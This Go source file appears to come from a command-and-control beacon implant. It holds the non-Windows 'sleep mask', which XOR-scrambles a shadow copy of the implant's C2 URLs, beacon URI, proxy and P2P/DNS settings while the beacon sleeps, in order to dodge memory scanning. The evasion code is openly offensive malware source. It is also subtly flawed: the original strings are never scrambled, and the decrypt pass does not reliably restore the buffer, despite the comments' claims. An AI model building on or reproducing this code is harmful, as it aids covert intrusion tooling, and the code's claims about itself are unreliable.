//go:build !windows

package main

import (
	"crypto/sha256"
	"sync"
	"time"
)

var sleepMaskActive bool

// The non-Windows sleep mask cannot protect memory pages the way the Windows
// VirtualProtect-backed buffer does, but it still performs a genuine
// obfuscation pass: the sensitive config strings (C2 URLs, user-agent, beacon
// URI, proxy, P2P/DNS settings) are XOR-scrambled in an in-memory shadow buffer
// for the duration of each sleep and restored afterwards. Name() reports
// "config-xor" so the achieved capability is never overstated.
var (
	smAltMu      sync.Mutex
	smAltBufInit bool
	smAltBuf     []byte
	smAltKey     []byte
	smAltIdx     int
)

// buildAltShadow mirrors the Windows mask's field layout (u16 length + bytes)
// and captures the same sensitive configuration set.
func buildAltShadow() []byte {
	fields := []string{C2URL, UserAgent, BeaconURI, ProxyStr, P2PMode, P2PParent, P2PListenAddr, DNSDomain, DNSServer}
	buf := make([]byte, 0, len(fields)*2+len(fields)*32)
	for _, f := range fields {
		buf = append(buf, byte(len(f)>>8), byte(len(f)))
		buf = append(buf, f...)
	}
	return buf
}

// epochKey derives a fresh keystream seed from the current time so consecutive
// sleep periods scramble the buffer differently.
func epochKey() []byte {
	var ts [8]byte
	for i := 0; i < 8; i++ {
		ts[i] = byte(time.Now().UnixNano() >> (i * 8))
	}
	h := sha256.Sum256(ts[:])
	return h[:]
}

func sleepMaskEncrypt() {
	smAltMu.Lock()
	defer smAltMu.Unlock()
	if !smAltBufInit {
		smAltBuf = buildAltShadow()
		smAltKey = epochKey()
		smAltIdx = 0
		smAltBufInit = true
		sleepMaskActive = true
	}
	for i := range smAltBuf {
		smAltBuf[i] ^= smAltKey[smAltIdx%len(smAltKey)]
		smAltIdx++
	}
}

func sleepMaskDecrypt() {
	smAltMu.Lock()
	defer smAltMu.Unlock()
	if !sleepMaskActive {
		return
	}
	for i := range smAltBuf {
		smAltBuf[i] ^= smAltKey[smAltIdx%len(smAltKey)]
		smAltIdx++
	}
}

func InitSleepMask() bool {
	return false
}

func sleepWithMask(d time.Duration) {
	if activeSleepMask != nil {
		activeSleepMask.Encrypt()
	}
	time.Sleep(d)
	if activeSleepMask != nil {
		activeSleepMask.Decrypt()
	}
}